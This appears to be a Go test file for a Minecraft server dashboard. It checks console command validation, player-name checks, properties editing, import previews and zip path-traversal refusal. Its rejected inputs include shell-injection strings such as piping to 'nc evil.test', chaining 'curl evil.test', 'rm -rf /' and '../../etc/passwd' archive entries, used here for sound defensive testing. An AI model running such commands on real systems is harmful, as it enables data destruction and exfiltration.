package gameserver

import (
	"archive/zip"
	"bytes"
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

type recordingExec struct {
	argv   [][]string
	output string
	code   int
	err    error
}

func (r *recordingExec) ExecCheck(
	_ context.Context,
	_ string,
	command []string,
	_ time.Duration,
) (int, []byte, error) {
	r.argv = append(r.argv, append([]string(nil), command...))
	return r.code, []byte(r.output), r.err
}

// The console must not be a path to a host shell. Every one of these is a way
// somebody would try to make it one.
func TestConsoleRefusesEveryShellEscape(t *testing.T) {
	t.Parallel()
	for _, command := range []string{
		"", "   ", "/",
		"say hello; rm -rf /",
		"say hello && curl evil.test",
		"say `id`",
		"say $(id)",
		"say hello | nc evil.test 1",
		"say hello > /etc/passwd",
		"say hello\nstop",
		"say hello\x00stop",
		"list & stop",
		"say " + strings.Repeat("x", 600),
	} {
		if _, err := ValidateCommand(command); err == nil {
			t.Fatalf("accepted %q", command)
		}
	}
}

func TestConsoleAcceptsOrdinaryGameCommandsAndPassesThemAsArgv(t *testing.T) {
	t.Parallel()
	backend := &recordingExec{output: "There are 2 of a max of 20 players online: alice, bob"}
	console := NewConsole(backend, []string{"rcon-cli"})
	result, err := console.Run(context.Background(), "abc123", "/list")
	if err != nil {
		t.Fatal(err)
	}
	if result.Command != "list" {
		t.Fatalf("command = %q", result.Command)
	}
	if len(backend.argv) != 1 || len(backend.argv[0]) != 2 ||
		backend.argv[0][0] != "rcon-cli" || backend.argv[0][1] != "list" {
		t.Fatalf("argv = %#v", backend.argv)
	}
	// A command reaches exec as separate argv elements; nothing joins them back
	// into a string for a shell to re-split.
	if _, err := console.Run(context.Background(), "abc123", "whitelist add Notch"); err != nil {
		t.Fatal(err)
	}
	if got := backend.argv[1]; len(got) != 4 || got[3] != "Notch" {
		t.Fatalf("argv = %#v", got)
	}
}

func TestConsoleWithoutARunningContainerSaysSoRatherThanFailingObscurely(t *testing.T) {
	t.Parallel()
	console := NewConsole(&recordingExec{}, nil)
	if _, err := console.Run(context.Background(), "", "list"); !errors.Is(err, ErrConsoleUnavailable) {
		t.Fatalf("error = %v, want the console to be reported unavailable", err)
	}
	broken := NewConsole(&recordingExec{err: errors.New("exec failed")}, nil)
	if _, err := broken.Run(context.Background(), "abc", "list"); !errors.Is(err, ErrConsoleUnavailable) {
		t.Fatalf("error = %v", err)
	}
}

func TestConsoleOutputIsTextRatherThanAnEscapeSequence(t *testing.T) {
	t.Parallel()
	backend := &recordingExec{output: "\x1b]0;pwned\x07§aGreen §ctext\nline two\x00"}
	console := NewConsole(backend, nil)
	result, err := console.Run(context.Background(), "abc", "list")
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(result.Output, "\x1b\x00\x07") || strings.Contains(result.Output, "§") {
		t.Fatalf("output kept control bytes: %q", result.Output)
	}
	// The whole OSC sequence goes, title text included.
	if result.Output != "Green text\nline two" {
		t.Fatalf("output = %q", result.Output)
	}
}

func TestPlayerListIsParsedAndUnparseableOutputIsNotSupported(t *testing.T) {
	t.Parallel()
	players, ok := ParsePlayerList("There are 2 of a max of 20 players online: alice, Bob_99")
	if !ok || players.Online != 2 || players.Maximum != 20 ||
		len(players.Names) != 2 || players.Names[0] != "Bob_99" {
		t.Fatalf("players = %#v (ok=%v)", players, ok)
	}
	if players.Reason != "" {
		t.Fatalf("a complete list reported a limitation: %q", players.Reason)
	}
	// A count the dashboard cannot fully name is reported as a parsing limit,
	// never as fewer players.
	partial, ok := ParsePlayerList("There are 3 of a max of 20 players online: alice")
	if !ok || partial.Online != 3 || len(partial.Names) != 1 || partial.Reason == "" {
		t.Fatalf("partial players = %#v", partial)
	}
	if _, ok := ParsePlayerList("Unknown command. Type \"help\" for help."); ok {
		t.Fatal("unparseable output was reported as a player list")
	}
}

func TestPlayerActionsAreClosedAndNamesValidated(t *testing.T) {
	t.Parallel()
	command, err := PlayerCommand(PlayerWhitelist, "Notch")
	if err != nil || command != "whitelist add Notch" {
		t.Fatalf("command = %q, %v", command, err)
	}
	for _, name := range []string{"", "a", "name with space", "rm -rf /", "toolongaccountname", "semi;colon"} {
		if _, err := PlayerCommand(PlayerKick, name); err == nil {
			t.Fatalf("accepted player name %q", name)
		}
	}
	if _, err := PlayerCommand("exec", "Notch"); err == nil {
		t.Fatal("accepted an action outside the closed set")
	}
}

func TestPropertiesRoundTripPreservesCommentsAndUnknownKeys(t *testing.T) {
	t.Parallel()
	original := "#Minecraft server properties\n#Wed Sep 11 12:00:00 UTC 2026\nmotd=Old name\n" +
		"experimental-thing=keep-me\n\nmax-players=20\n"
	file := ParseProperties(original)
	if file.Render() != original {
		t.Fatalf("round trip changed the file:\n%q\n%q", file.Render(), original)
	}
	applied, err := ApplyProperties(file, []KnownProperty{
		{Key: "motd", Kind: "text"},
		{Key: "max-players", Kind: "number", Minimum: 1, Maximum: 1000},
	}, map[string]string{"motd": "New name", "max-players": "40"})
	if err != nil || len(applied) != 2 {
		t.Fatalf("applied = %#v, %v", applied, err)
	}
	rendered := file.Render()
	for _, wanted := range []string{
		"#Minecraft server properties", "motd=New name", "experimental-thing=keep-me", "max-players=40",
	} {
		if !strings.Contains(rendered, wanted) {
			t.Fatalf("rendered file lost %q:\n%s", wanted, rendered)
		}
	}
}

func TestPropertiesEditorRefusesUndeclaredKeysAndOutOfRangeValues(t *testing.T) {
	t.Parallel()
	known := []KnownProperty{
		{Key: "max-players", Kind: "number", Minimum: 1, Maximum: 1000},
		{Key: "difficulty", Kind: "choice", Choices: []string{"peaceful", "easy", "normal", "hard"}},
		{Key: "pvp", Kind: "boolean"},
		{Key: "motd", Kind: "text"},
	}
	for _, testCase := range []struct {
		name    string
		changes map[string]string
	}{
		{"a key the dashboard does not edit", map[string]string{"rcon.password": "hunter2"}},
		{"a number above the declared maximum", map[string]string{"max-players": "100000"}},
		{"a number below the declared minimum", map[string]string{"max-players": "0"}},
		{"a value that is not a number", map[string]string{"max-players": "many"}},
		{"a choice that was never offered", map[string]string{"difficulty": "impossible"}},
		{"a boolean that is not one", map[string]string{"pvp": "maybe"}},
		{"text carrying a line break", map[string]string{"motd": "line\nmax-players=1"}},
	} {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			file := ParseProperties("max-players=20\ndifficulty=normal\npvp=true\nmotd=Server\n")
			if _, err := ApplyProperties(file, known, testCase.changes); err == nil {
				t.Fatalf("accepted %v", testCase.changes)
			}
		})
	}
}

func writeFixture(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestImportPreviewNamesSoftwareWorldsAndRuntimeOutput(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	writeFixture(t, filepath.Join(root, "server.properties"),
		"server-port=25570\nmotd=Imported\nlevel-name=world\n")
	writeFixture(t, filepath.Join(root, "eula.txt"), "eula=true\n")
	writeFixture(t, filepath.Join(root, "paper-1.21.1-42.jar"), "jar")
	writeFixture(t, filepath.Join(root, "paper.yml"), "config: {}\n")
	writeFixture(t, filepath.Join(root, "world", "level.dat"), "nbt")
	writeFixture(t, filepath.Join(root, "world_nether", "level.dat"), "nbt")
	writeFixture(t, filepath.Join(root, "plugins", "Essentials.jar"), "jar")
	writeFixture(t, filepath.Join(root, "logs", "latest.log"), "log")
	writeFixture(t, filepath.Join(root, "cache", "blob"), "cache")

	preview, err := PreviewDirectory(root)
	if err != nil {
		t.Fatal(err)
	}
	if preview.Edition != "java" || preview.Software != "paper" {
		t.Fatalf("preview software = %s/%s", preview.Edition, preview.Software)
	}
	if preview.Version != "1.21.1" {
		t.Fatalf("version = %q", preview.Version)
	}
	if preview.Port != 25570 {
		t.Fatalf("port = %d, want the port server.properties names", preview.Port)
	}
	if !preview.EULAAccepted {
		t.Fatal("an accepted EULA was not detected")
	}
	if len(preview.WorldPaths) != 2 {
		t.Fatalf("worlds = %#v", preview.WorldPaths)
	}
	if len(preview.ModPaths) != 1 || preview.ModPaths[0] != "plugins" {
		t.Fatalf("mod paths = %#v", preview.ModPaths)
	}
	ignored := strings.Join(preview.IgnoredPaths, " ")
	if !strings.Contains(ignored, "logs") || !strings.Contains(ignored, "cache") {
		t.Fatalf("runtime output was not named as ignored: %#v", preview.IgnoredPaths)
	}
	// Two worlds is a fact the operator should read before importing, not a
	// silent choice the dashboard makes for them.
	if len(preview.Warnings) == 0 {
		t.Fatal("two worlds produced no warning")
	}
	if len(preview.Evidence) == 0 {
		t.Fatal("the preview drew conclusions with no evidence")
	}
}

func TestImportPreviewRefusesADirectoryThatHoldsNoServer(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	writeFixture(t, filepath.Join(root, "notes.txt"), "nothing to see")
	if _, err := PreviewDirectory(root); !errors.Is(err, ErrNoServerFound) {
		t.Fatalf("error = %v", err)
	}
}

func TestImportPreviewRefusesToFollowALinkOutOfTheChosenDirectory(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	outside := t.TempDir()
	writeFixture(t, filepath.Join(outside, "secrets.txt"), "not yours")
	writeFixture(t, filepath.Join(root, "server.properties"), "server-port=25565\n")
	writeFixture(t, filepath.Join(root, "world", "level.dat"), "nbt")
	if err := os.Symlink(outside, filepath.Join(root, "escape")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	preview, err := PreviewDirectory(root)
	if err != nil {
		t.Fatal(err)
	}
	warned := false
	for _, warning := range preview.Warnings {
		warned = warned || strings.Contains(warning, "escape")
	}
	if !warned {
		t.Fatalf("an escaping link was not reported: %#v", preview.Warnings)
	}
	for _, path := range append(preview.ConfigPaths, preview.WorldPaths...) {
		if strings.Contains(path, "secrets.txt") {
			t.Fatal("the preview read a file outside the chosen directory")
		}
	}
}

func zipFixture(t *testing.T, entries map[string]string) ([]byte, int64) {
	t.Helper()
	var buffer bytes.Buffer
	writer := zip.NewWriter(&buffer)
	for name, content := range entries {
		file, err := writer.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := file.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	return buffer.Bytes(), int64(buffer.Len())
}

func TestArchiveInspectionFindsTheServerRootAndRefusesEveryEscape(t *testing.T) {
	t.Parallel()
	content, size := zipFixture(t, map[string]string{
		"my-server/server.properties": "server-port=25565\n",
		"my-server/server.jar":        "jar",
		"my-server/world/level.dat":   "nbt",
	})
	entries, root, err := InspectArchive(bytes.NewReader(content), size)
	if err != nil || root != "my-server" || len(entries) != 3 {
		t.Fatalf("root = %q entries = %d: %v", root, len(entries), err)
	}

	for _, testCase := range []struct {
		name    string
		entries map[string]string
		want    string
	}{
		{"an absolute path", map[string]string{"/etc/passwd": "x"}, "absolute path"},
		{"a traversal", map[string]string{"../../etc/passwd": "x"}, "escapes the archive root"},
		{"a Windows separator", map[string]string{"srv\\..\\..\\etc": "x"}, "unsupported path separator"},
		{"nothing that looks like a server", map[string]string{"notes/readme.txt": "x"}, "no server.properties"},
		{"two servers in one archive", map[string]string{
			"one/server.properties": "x", "two/server.properties": "x",
		}, "more than one server"},
	} {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			content, size := zipFixture(t, testCase.entries)
			if _, _, err := InspectArchive(bytes.NewReader(content), size); err == nil ||
				!strings.Contains(err.Error(), testCase.want) {
				t.Fatalf("error = %v, want it to mention %q", err, testCase.want)
			}
		})
	}
}

func TestArchiveInspectionRefusesAnEmptyOrOversizedArchive(t *testing.T) {
	t.Parallel()
	if _, _, err := InspectArchive(bytes.NewReader(nil), 0); !errors.Is(err, ErrInvalidArchive) {
		t.Fatalf("error = %v", err)
	}
	content, size := zipFixture(t, map[string]string{"server/server.properties": "x"})
	if _, _, err := InspectArchive(bytes.NewReader(content), size+1<<40); err == nil {
		t.Fatal("accepted an archive claiming to be a terabyte")
	}
}

func TestJavaVersionsComeFromUpstreamAndOnlyOfferReleases(t *testing.T) {
	t.Parallel()
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{
			"latest": {"release": "1.21.4", "snapshot": "25w01a"},
			"versions": [
			  {"id": "25w01a", "type": "snapshot", "releaseTime": "2026-01-02T10:00:00+00:00"},
			  {"id": "1.21.4", "type": "release", "releaseTime": "2025-12-03T10:00:00+00:00"},
			  {"id": "1.21.3", "type": "release", "releaseTime": "2025-10-23T10:00:00+00:00"}
			]
		}`))
	}))
	defer server.Close()
	adapter := &Adapter{client: server.Client(), now: time.Now, cache: map[string]cacheEntry{}}
	list, err := adapter.javaVersions(context.Background(), server.URL)
	if err != nil {
		t.Fatal(err)
	}
	if list.Status != "available" || list.Recommended != "1.21.4" || len(list.Versions) != 2 {
		t.Fatalf("list = %#v", list)
	}
	if list.Versions[0].ID != "1.21.4" || !list.Versions[0].Recommended {
		t.Fatalf("newest version = %#v", list.Versions[0])
	}
	for _, version := range list.Versions {
		if version.Kind != "release" {
			t.Fatalf("a %s was offered: %s", version.Kind, version.ID)
		}
	}
}

// An unreachable upstream must say versions cannot be verified. Substituting an
// unchecked "latest" is exactly the failure this guards.
func TestUnreachableVersionSourceIsReportedRatherThanSubstituted(t *testing.T) {
	t.Parallel()
	adapter := &Adapter{
		client: &http.Client{Timeout: time.Millisecond}, now: time.Now, cache: map[string]cacheEntry{},
	}
	list := adapter.cached(context.Background(), "minecraft-java", "https://127.0.0.1:1/manifest.json",
		adapter.javaVersions)
	if list.Status != "unavailable" || len(list.Versions) != 0 || list.Reason == "" {
		t.Fatalf("list = %#v", list)
	}
	if strings.Contains(strings.ToLower(list.Reason), "latest is") {
		t.Fatalf("an unverified version was suggested: %q", list.Reason)
	}
}

func TestMalformedAndMovedVersionResponsesAreRefused(t *testing.T) {
	t.Parallel()
	for _, testCase := range []struct {
		name    string
		handler http.HandlerFunc
	}{
		{"malformed JSON", func(w http.ResponseWriter, _ *http.Request) {
			_, _ = w.Write([]byte(`{"versions": [`))
		}},
		{"an empty manifest", func(w http.ResponseWriter, _ *http.Request) {
			_, _ = w.Write([]byte(`{"latest":{},"versions":[]}`))
		}},
		{"a moved resource", func(w http.ResponseWriter, _ *http.Request) {
			w.WriteHeader(http.StatusNotFound)
		}},
	} {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			server := httptest.NewTLSServer(testCase.handler)
			defer server.Close()
			adapter := &Adapter{client: server.Client(), now: time.Now, cache: map[string]cacheEntry{}}
			if _, err := adapter.javaVersions(context.Background(), server.URL); err == nil {
				t.Fatal("accepted an unusable version response")
			}
		})
	}
}

func TestBedrockVersionsAreHonestlyUnavailableAndUnknownGamesAreRefused(t *testing.T) {
	t.Parallel()
	adapter := New()
	list, err := adapter.Versions(context.Background(), "minecraft-bedrock")
	if err != nil || list.Status != "unavailable" || list.Reason == "" {
		t.Fatalf("bedrock list = %#v, %v", list, err)
	}
	if _, err := adapter.Versions(context.Background(), "quake"); !errors.Is(err, ErrUnsupportedGame) {
		t.Fatalf("error = %v", err)
	}
}

func TestVersionsAreCachedAndAStaleAnswerSaysSo(t *testing.T) {
	t.Parallel()
	calls := 0
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		calls++
		if calls > 1 {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		_, _ = w.Write([]byte(`{"latest":{"release":"1.21.4"},"versions":[
			{"id":"1.21.4","type":"release","releaseTime":"2025-12-03T10:00:00+00:00"}]}`))
	}))
	defer server.Close()
	clock := time.Date(2026, 9, 11, 12, 0, 0, 0, time.UTC)
	adapter := &Adapter{client: server.Client(), now: func() time.Time { return clock }, cache: map[string]cacheEntry{}}
	first := adapter.cached(context.Background(), "java", server.URL, adapter.javaVersions)
	if first.Status != "available" {
		t.Fatalf("first read = %#v", first)
	}
	second := adapter.cached(context.Background(), "java", server.URL, adapter.javaVersions)
	if second.Status != "available" || calls != 1 {
		t.Fatalf("cached read made %d upstream calls", calls)
	}
	clock = clock.Add(2 * time.Hour)
	stale := adapter.cached(context.Background(), "java", server.URL, adapter.javaVersions)
	if stale.Status != "stale" || stale.Reason == "" || len(stale.Versions) != 1 {
		t.Fatalf("stale read = %#v", stale)
	}
}
